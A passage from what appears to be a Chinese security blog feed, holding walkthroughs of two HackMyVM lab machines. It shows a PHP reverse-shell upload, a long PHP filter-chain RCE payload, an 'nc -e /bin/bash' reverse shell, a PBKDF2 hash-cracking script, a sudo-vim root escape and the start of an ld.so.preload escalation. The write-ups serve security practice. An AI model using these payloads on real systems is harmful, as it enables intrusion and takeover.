&lt;!-- ##{'timestamp':1738666533}## --&gt;sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/panghu.html</guid><pubDate>Tue, 04 Feb 2025 10:55:33 +0000</pubDate></item><item><title>hmv_friendly</title><link>https://7r1UMPHK.github.io/post/hmv_friendly.html</link><description># 0.简介

靶机：https://hackmyvm.eu/machines/machine.php?vm=Friendly
 难度：绿色
 目标 IP：192.168.205.129
 本机 IP：192.168.205.128

# 1.扫描

nmap起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -sT -Pn -n -p- --min-rate 10000 192.168.205.129  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-03 12:26 CST
Nmap scan report for 192.168.205.129
Host is up (0.00059s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.10 seconds
```

# 2.踩点

先进行ftp匿名登录

```
┌──(kali㉿kali)-[~/test]
└─$ ftp 192.168.205.129
Connected to 192.168.205.129.
220 ProFTPD Server (friendly) [::ffff:192.168.205.129]
Name (192.168.205.129:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls -la
229 Entering Extended Passive Mode (|||17885|)
150 Opening ASCII mode data connection for file list
drwxrwxrwx   2 root     root         4096 Mar 11  2023 .
drwxrwxrwx   2 root     root         4096 Mar 11  2023 ..
-rw-r--r--   1 root     root        10725 Feb 23  2023 index.html
```

和我们发现的网页目录架构一样，我们可以尝试上传一个反弹shell上去访问

```
ftp&gt; put php.php 
local: php.php remote: php.php
229 Entering Extended Passive Mode (|||22559|)
150 Opening BINARY mode data connection for php.php
100% |*****************************************************************************************|  2596      255.89 KiB/s    00:00 ETA
226 Transfer complete
2596 bytes sent in 00:00 (241.58 KiB/s)
ftp&gt; ls
229 Entering Extended Passive Mode (|||7798|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 root     root        10725 Feb 23  2023 index.html
-rw-r--r--   1 ftp      nogroup      2596 Feb  3 04:32 php.php
226 Transfer complete
```

访问

```
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.129] 35158
Linux friendly 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64 GNU/Linux
 23:33:07 up 7 min,  0 users,  load average: 1.36, 6.63, 3.71
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (439): Inappropriate ioctl for device
bash: no job control in this shell
```

# 3. 获得稳定的 Shell

获取反向 shell 后，通过以下命令获得稳定的交互式 TTY shell：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.提权

```
www-data@friendly:/$ ls -la
total 68
drwxr-xr-x  18 root root  4096 Mar 11  2023 .
drwxr-xr-x  18 root root  4096 Mar 11  2023 ..
lrwxrwxrwx   1 root root     7 Feb 21  2023 bin -&gt; usr/bin
drwxr-xr-x   3 root root  4096 Feb 21  2023 boot
drwxr-xr-x  17 root root  3140 Feb  2 23:26 dev
drwxr-xr-x  69 root root  4096 Feb  2 23:26 etc
drwxr-xr-x   3 root root  4096 Feb 21  2023 home
lrwxrwxrwx   1 root root    31 Feb 21  2023 initrd.img -&gt; boot/initrd.img-5.10.0-21-amd64
lrwxrwxrwx   1 root root    31 Feb 21  2023 initrd.img.old -&gt; boot/initrd.img-5.10.0-18-amd64
lrwxrwxrwx   1 root root     7 Feb 21  2023 lib -&gt; usr/lib
lrwxrwxrwx   1 root root     9 Feb 21  2023 lib32 -&gt; usr/lib32
lrwxrwxrwx   1 root root     9 Feb 21  2023 lib64 -&gt; usr/lib64
lrwxrwxrwx   1 root root    10 Feb 21  2023 libx32 -&gt; usr/libx32
drwx------   2 root root 16384 Feb 21  2023 lost+found
drwxr-xr-x   3 root root  4096 Feb 21  2023 media
drwxr-xr-x   2 root root  4096 Feb 21  2023 mnt
drwxr-xr-x   2 root root  4096 Feb 21  2023 opt
dr-xr-xr-x 145 root root     0 Feb  2 23:26 proc
drwx------   3 root root  4096 Mar 11  2023 root
drwxr-xr-x  17 root root   540 Feb  2 23:26 run
lrwxrwxrwx   1 root root     8 Feb 21  2023 sbin -&gt; usr/sbin
drwxr-xr-x   2 root root  4096 Mar 11  2023 srv
dr-xr-xr-x  13 root root     0 Feb  2 23:26 sys
drwxrwxrwt   2 root root  4096 Feb  2 23:26 tmp
drwxr-xr-x  14 root root  4096 Feb 21  2023 usr
drwxr-xr-x  12 root root  4096 Feb 21  2023 var
lrwxrwxrwx   1 root root    28 Feb 21  2023 vmlinuz -&gt; boot/vmlinuz-5.10.0-21-amd64
lrwxrwxrwx   1 root root    28 Feb 21  2023 vmlinuz.old -&gt; boot/vmlinuz-5.10.0-18-amd64
www-data@friendly:/$ sudo -l
Matching Defaults entries for www-data on friendly:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on friendly:
    (ALL : ALL) NOPASSWD: /usr/bin/vim
```

![image-20250331191435274](https://7r1umphk.github.io/image/20250331191435317.png)

🔗https://gtfobins.github.io/gtfobins/vim/#sudo

```
www-data@friendly:/$ sudo vim -c ':!/bin/sh'

# id
uid=0(root) gid=0(root) groups=0(root)
```

&lt;!-- ##{'timestamp':1738580133}## --&gt;sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_friendly.html</guid><pubDate>Mon, 03 Feb 2025 10:55:33 +0000</pubDate></item><item><title>Listen</title><link>https://7r1UMPHK.github.io/post/Listen.html</link><description># 0.简介

这是一个群友的靶机，我不知道他发不发布，所以就看看吧，学习学习

目标 IP：192.168.205.137
 本机 IP：192.168.205.128

# 1.扫描

nmap起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -A -Pn -n --min-rate 10000 192.168.205.137
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-03 13:15 CST
Nmap scan report for 192.168.205.137
Host is up (0.00021s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)
| ssh-hostkey: 
|   2048 c2:91:d9:a5:f7:a3:98:1f:c1:4a:70:28:aa:ba:a4:10 (RSA)
|   256 3e:1f:c9:eb:c0:6f:24:06:fc:52:5f:2f:1b:35:33:ec (ECDSA)
|_  256 ec:64:87:04:9a:4b:32:fe:2d:1f:9a:b0:81:d3:7c:cf (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: \xE5\x87\x9B\xE5\x86\xBD\xE6\x99\x82\xE9\x9B\xA8 - \xE5\x85\xAC\xE5\xBC\x8F\xE3\x82\xA6\xE3\x82\xA7\xE3\x83\x96\xE3\x82\xB5\xE3\x82\xA4\xE3\x83\x88
|_http-server-header: nginx/1.14.2
MAC Address: 08:00:27:97:BD:AA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.22 ms 192.168.205.137

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.90 seconds
                                                                
```

# 2.踩点

![image-20250331190947415](https://7r1umphk.github.io/image/20250331190947584.png)

测文件包含，测完了也没结果，所以来个目录爆破先

```
┌──(kali㉿kali)-[~/test]
└─$ feroxbuster -u http://192.168.205.137 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,md,txt
                                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben 'epi' Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.205.137
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html, md, txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       48l      102w     2359c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
403      GET        7l       10w      169c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
404      GET        7l       12w      169c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
200      GET        3l        1w       16c http://192.168.205.137/test.php
200      GET        2l        1w       17c http://192.168.205.137/tools.php
200      GET        1l        3w      228c http://192.168.205.137/README.md
200      GET        2l        1w       15c http://192.168.205.137/pp.php
```

探索一下

```
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.137/test.php                
&lt;h1&gt;test&lt;/h1&gt;


                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.137/tools.php
&lt;h1&gt;tools&lt;/h1&gt;
 
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.137/pp.php   
&lt;h1&gt;test&lt;/h1&gt;

                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.137/README.md
2025年1月22日　本プロジェクトの開発は一旦ここで終了です。正式にプロジェクトが2月に公開される前に、テスト部分を必ず整理してください。——開発チーム　アダシ
                        
```

前面在首页可以看到是用do函数传参，所以我们测试一下

```
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.137/test.php?do=../../../etc/passwd
&lt;h1&gt;test&lt;/h1&gt;
self-hacking!                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.137/tools.php?do=../../../etc/passwd
&lt;h1&gt;tools&lt;/h1&gt;
 
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.137/pp.php?do=../../../etc/passwd
&lt;h1&gt;test&lt;/h1&gt;
try
                   
```

两个有反应，tools没反应，我用的是pp.php

```
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.137/pp.php?do=php://filter/convert.base64-encode/resource=../../../../etc/passwd
&gt; 
&lt;h1&gt;test&lt;/h1&gt;
trycm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLXRpbWVzeW5jOng6MTAxOjEwMjpzeXN0ZW1kIFRpbWUgU3luY2hyb25pemF0aW9uLCwsOi9ydW4vc3lzdGVtZDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLW5ldHdvcms6eDoxMDI6MTAzOnN5c3RlbWQgTmV0d29yayBNYW5hZ2VtZW50LCwsOi9ydW4vc3lzdGVtZDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLXJlc29sdmU6eDoxMDM6MTA0OnN5c3RlbWQgUmVzb2x2ZXIsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCm1lc3NhZ2VidXM6eDoxMDQ6MTEwOjovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1jb3JlZHVtcDp4Ojk5OTo5OTk6c3lzdGVtZCBDb3JlIER1bXBlcjovOi91c3Ivc2Jpbi9ub2xvZ2luCnNzaGQ6eDoxMDU6NjU1MzQ6Oi9ydW4vc3NoZDovdXNyL3NiaW4vbm9sb2dpbgp3ZWxjb21lOng6MTAwMToxMDAxOjovaG9tZS93ZWxjb21lOi9iaW4vc2gKbXlzcWw6eDoxMDY6MTEzOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQo=
                                                          
```

有回显，所以测一下php filter

```
http://192.168.205.137/pp.php?do=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;0=id
```

![image-20250331190958726](https://7r1umphk.github.io/image/20250331190958775.png)

弹shell

```
http://192.168.205.137/pp.php?do=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;0=nc%20192.168.205.128%208888%20-e%20/bin/bash
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888                                
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.137] 50510
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 3. 获得稳定的 Shell

获取反向 shell 后，通过以下命令获得稳定的交互式 TTY shell：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.提权

```
www-data@listen:~/html/wordpress$ ls -al
total 60
drwxr-xr-x 2 www-data www-data 4096 Feb  1 21:51 .
drwxr-xr-x 3 root     root     4096 Jan  7 23:52 ..
-rw-r--r-- 1 root     root       92 Feb  1 11:13 .2024_12_25_project_web_login_password.bak
-rw-r--r-- 1 root     root      228 Feb  1 09:50 README.md
-rw-r--r-- 1 root     root     1783 Feb  1 09:33 album_1.php
-rw-r--r-- 1 root     root     2004 Feb  1 09:32 album_2.php
-rw-r--r-- 1 root     root     1861 Feb  1 09:31 album_3.php
-rw-r--r-- 1 root     root     1781 Feb  1 09:30 album_4.php
-rw-r--r-- 1 root     root     2057 Feb  1 09:26 album_5.php
-rw-r--r-- 1 root     root     2359 Feb  1 09:12 home.php
-rw-r--r-- 1 root     root      315 Feb  1 09:07 index.php
-rw-r--r-- 1 root     root      219 Feb  1 21:48 pp.php
-rw-r--r-- 1 root     root     3972 Feb  1 09:23 styles.css
-rw-r--r-- 1 root     root      675 Feb  1 21:51 test.php
-rw-r--r-- 1 root     root      153 Feb  1 09:37 tools.php
www-data@listen:~/html/wordpress$ cat .2024_12_25_project_web_login_password.bak
pbkdf2:sha256:50000:flower:0916690d7bc2f92a0e1f1640ce7ee22e988843323efb8c8e43064eafed92b028
```

看样子要破解这个hash

```
┌──(kali㉿kali)-[~/test]
└─$ cat tmp.py
import hashlib
import binascii
from concurrent.futures import ProcessPoolExecutor, as_completed
from tqdm import tqdm

def pbkdf2_sha256(password, salt, iterations=50000, dklen=32):
    '''使用PBKDF2-HMAC-SHA256算法计算哈希'''
    return hashlib.pbkdf2_hmac('sha256', password.encode('utf-8'), salt.encode('utf-8'), iterations, dklen)

def check_password(password_chunk, target_hash, salt, iterations):
    '''检查给定密码块中的每个密码是否匹配目标哈希'''
    results = []
    for password in tqdm(password_chunk, desc='Processing chunk', unit='passwords'):
        password = password.strip()
        hashed_password = pbkdf2_sha256(password, salt, iterations)
        if binascii.hexlify(hashed_password).decode() == target_hash:
            results.append(password)
    return results

def crack_pbkdf2_hash(target_hash, salt, iterations=50000, dictionary_file='/usr/share/wordlists/rockyou.txt'):
    '''尝试通过字典攻击破解PBKDF2哈希'''
    chunk_size = 1000  # 每个进程处理的密码数量
    passwords = []
    with open(dictionary_file, 'r', encoding='utf-8', errors='ignore') as file:
        while True:
            password_chunk = list(islice(file, chunk_size))
            if not password_chunk:
                break
            passwords.append(password_chunk)

    with ProcessPoolExecutor() as executor:
        futures = [executor.submit(check_password, chunk, target_hash, salt, iterations) for chunk in passwords]
        for future in as_completed(futures):
            result = future.result()
            if result:
                print(f'找到密码: {result}')
                return result
    print('字典中没有找到匹配的密码')
    return None

if __name__ == '__main__':
    from itertools import islice
  
    target_hash = '0916690d7bc2f92a0e1f1640ce7ee22e988843323efb8c8e43064eafed92b028'
    salt = 'flower'
  
    crack_pbkdf2_hash(target_hash, salt)
                                                       
┌──(kali㉿kali)-[~/test]
└─$ python3 tmp.py
找到密码: ['roseflower']
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ grep -r -w -n 'roseflower' /usr/share/wordlists/rockyou.txt                            
122049:roseflower
                                   
```

还挺后

```
www-data@listen:~/html/wordpress$ ls -la /home/
total 12
drwxr-xr-x  3 root    root    4096 Jan  7 23:16 .
drwxr-xr-x 18 root    root    4096 Jan  7 21:50 ..
drwx------  2 welcome welcome 4096 Feb  1 11:10 welcome
www-data@listen:~/html/wordpress$ su - welcome
Password: 
$ id                                                                                                                                 
uid=1001(welcome) gid=1001(welcome) groups=1001(welcome)
```

继续

```
welcome@listen:~$ ls -al
total 20
drwx------ 2 welcome welcome 4096 Feb  1 11:10 .
-rw-r--r-- 1 root    root      11 Feb  1 11:10 .-
drwxr-xr-x 3 root    root    4096 Jan  7 23:16 ..
-rw------- 1 welcome welcome   69 Feb  1 07:13 .bash_history
-rw-r--r-- 1 root    root      33 Jan  7 23:18 user.txt
welcome@listen:~$ cat .bash_history
sudo -l
cat /etc/passwd
poweroff
ls
whoami
cd /root
whoami
su - root
welcome@listen:~$ sudo -l
[sudo] password for welcome: 
Sorry, user welcome may not run sudo on listen.
welcome@listen:~$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/touch
/usr/bin/su
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

/usr/bin/touch是多的，找一下怎么提权吧，找半天也找不到，我就等群u的wp了

![image-20250331191023675](https://7r1umphk.github.io/image/20250331191023738.png)

过修改 /etc/ld.so.preload 文件实现获得 root 权限，我们跟着实现一下

查看一下touch命令的so的跟踪流

```
┌──(kali㉿kali)-[~/test]
└─$ strace touch 2&gt;&amp;1 | grep -Pi 'open|access|no such file'
strace: Symbol `_UPT_accessors' has different size in shared object, consider re-linking
access('/etc/ld.so.preload', R_OK)      = -1 ENOENT (没有那个文件或目录)
openat(AT_FDCWD, '/etc/ld.so.cache', O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, '/lib/x86_64-linux-gnu/libc.so.6', O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, '/usr/lib/locale/locale-archive', O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, '/usr/share/locale/locale.alias', O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, '/usr/share/locale/zh_CN.UTF-8/LC_MESSAGES/coreutils.mo', O_RDONLY) = -1 ENOENT (没有那个文件或目录)
openat(AT_FDCWD, '/usr/share/locale/zh_CN.utf8/LC_MESSAGES/coreutils.mo', O_RDONLY) = -1 ENOENT (没有那个文件或目录)
openat(AT_FDCWD, '/usr/share/locale/zh_CN/LC_MESSAGES/coreutils.mo', O_RDONLY) = 3
openat(AT_FDCWD, '/usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache', O_RDONLY|O_CLOEXEC) = 3
```

/etc/ld.so.preload 是缺失的，我们去靶机看看

```
welcome@listen:~$ ls -la /etc/ld.so.preload                                                                                          
ls: cannot access '/etc/ld.so.preload': No such file or directory   
```

那简单了，我们去创建一个恶意so就好了

